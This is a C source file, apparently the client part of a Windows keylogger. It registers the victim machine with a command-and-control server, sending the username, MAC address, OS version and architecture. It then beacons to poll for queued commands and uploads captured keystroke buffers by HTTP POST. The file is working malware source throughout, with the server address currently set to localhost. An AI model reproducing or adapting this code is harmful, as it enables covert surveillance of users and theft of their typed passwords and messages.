
#include "client.h"

static void retrieveVersionInfo(char* version);
static void retrieveArchInfo(char* arch);

/**
 * Initialises the client structure, retrieves the current users username and MAC address
 * and stores it as their ID. Then establishes a connection with the C2 and stores the 
 * internet handles in the client structure for future use
 * 
 * @return newly allocated CLIENT_HANDLER struct address
 */
CLIENT_HANDLER* initClient() {
    CLIENT_HANDLER* client = malloc(sizeof(CLIENT_HANDLER));
    if (client == NULL) { return NULL; }
    memset(client->id, '\0', MAX_ID_LEN);
    memset(client->cmdBuffer, '\0', MAX_BUFF_LEN);

    // get the unique client ID as <user_name>-<compute_name>
    DWORD size = UNLEN + 1;
    char buffUser[size];
    if (!GetUserNameA(buffUser, &size)) { return NULL; }

    char mac[18];
    RET_CODE ret = retrieveMAC(mac);
    if (ret != R_SUCCESS) { return NULL; }
    
    // initialise and encode the client id, we can now register them with the server
    sprintf(client->id, "%s-%s", buffUser, mac);

    // establish connection
    HINTERNET hSession = InternetOpenA("server", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession == NULL) { return NULL; }
    client->hSession = hSession;

    HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) { return NULL; }
    client->hConnect = hConnect;  // init client internet handle

    return client;
}


/**
 * Retrieve all cleint registration information and sent it to the server.
 * The server responds with the random encoding key which is stored in the
 * key logger
 * 
 * @param client the client to register
 * @param progContextKey the program context (ctx) key to be initialised
 * @return flag associated with the success/failure of this operation
 */
RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
    time_t seconds = getCurrentTime();

    char version[32];
    retrieveVersionInfo(version); // retrieve version info
    char arch[16];
    retrieveArchInfo(arch);       // retrieve architecture info

    // send the register data that includes system infomation!
    char registerStr[MAX_MSG_LEN];
    snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%ld", client->id, version, arch, seconds);

    // (ab)uses GET request to send os fingerprint
    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) { printf("1\n"); return R_NULL; }

    // send the register request
    if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
        InternetCloseHandle(hRequest);
        return R_GET;
    }

    // read the key from the response
    DWORD bytesRead;
    unsigned char key[2];
    if (!InternetReadFile(hRequest, key, 1, &bytesRead) && bytesRead != 0) { return R_GET; }

    // set the program context encoding key
    *progContextKey = key[0];

    InternetCloseHandle(hRequest);
    return R_SUCCESS;
}

/**
 * retrieve the Windows version information to be sent as part
 * of the client register
 * 
 * @param version reciever for version information
 */
static void retrieveVersionInfo(char* version) {
    OSVERSIONINFOA vInfo =  { 0 };   // gets version information
    vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    if (!GetVersionExA(&vInfo)) {
        sprintf(version, "UNKNOWN-WIN-V");
    } else {
        sprintf(version, "WIN-%ld.%ld", vInfo.dwMajorVersion, vInfo.dwMinorVersion);
    }
}

/**
 * retrieves the architecture string associated with the client 
 * machine to also be sent during registration
 * 
 * @param arch reciever for architecture information
 */
static void retrieveArchInfo(char* arch) {
    SYSTEM_INFO sInfo;   // get architecture information
    GetSystemInfo(&sInfo);

    switch (sInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            sprintf(arch, "AMD-INTEL"); break;
        case PROCESSOR_ARCHITECTURE_ARM:
            sprintf(arch, "ARM"); break;
        case PROCESSOR_ARCHITECTURE_ARM64:
            sprintf(arch, "ARM64"); break;
        case PROCESSOR_ARCHITECTURE_IA64:
            sprintf(arch, "Intel-Itanium"); break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            sprintf(arch, "x86"); break;
        default:
            sprintf(arch, "UNKNOWN"); break;
    }
}

/**
 * Performs an HTTP GET request to the server to get all the this client queued commands. 
 * This mthod also serves as a "beaconing" to the server to tell it "I am still active"
 * 
 * @param client the current client
 * @return flag associated with result of this operation
 */
RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
    time_t seconds = getCurrentTime();
    char commandRequ[MAX_MSG_LEN];
    snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%ld", client->id, seconds);

    // set up the request
    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) { return R_GET; }

    // send out the request
    if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
        InternetCloseHandle(hRequest);
        return R_GET;
    }

    // read the commands into the command buffer!
    DWORD bytesRead;
    if (!InternetReadFile(hRequest, client->cmdBuffer, MAX_BUFF_LEN - 1, &bytesRead)) {
        return R_GET;
    }
    client->cmdBuffer[bytesRead] = '\0';
    InternetCloseHandle(hRequest);

    if (bytesRead == 0) { return R_EMPTY_BUFFER; }
    return R_SUCCESS;
}

/**
 * Simply send the key log buffer to the C2!
 * 
 * @param client the current client
 * @param kLogger key logger struct which contains captured key strokes
 */
RET_CODE writeLogToC2(CLIENT_HANDLER* client, KEY_LOGGER* kLogger) {
    char logStr[MAX_MSG_LEN];
    snprintf(logStr, MAX_MSG_LEN, "/logs/%s", client->id);

    // send logs
    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) { return R_POST; }

    HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID) kLogger->keyBuffer, kLogger->bufferPtr);
    InternetCloseHandle(hRequest);

    return R_SUCCESS;
}

/**
 * Simply free all memory asscoated with a client struct
 * 
 * @param client the curretn client
 */
void clientCleanup(CLIENT_HANDLER *client) {
    if (client == NULL) { return; }

    // close internet handles
    if (client->hConnect != NULL) { InternetCloseHandle(client->hConnect); }
    if (client->hSession != NULL) { InternetCloseHandle(client->hSession); }
    free(client);
}